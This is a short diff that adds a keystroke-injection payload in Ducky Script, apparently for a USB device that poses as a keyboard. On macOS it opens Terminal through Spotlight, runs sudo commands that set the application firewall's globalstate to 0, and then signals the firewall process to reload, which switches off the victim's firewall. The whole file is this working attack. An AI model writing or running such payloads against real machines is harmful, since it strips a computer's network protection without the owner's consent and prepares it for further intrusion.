@@ -1,0 +1,11 @@
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 500
+STRING sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
+ENTER
+DELAY 500
+STRING sudo pkill -HUP -f '/usr/libexec/ApplicationFirewall'
+ENTER
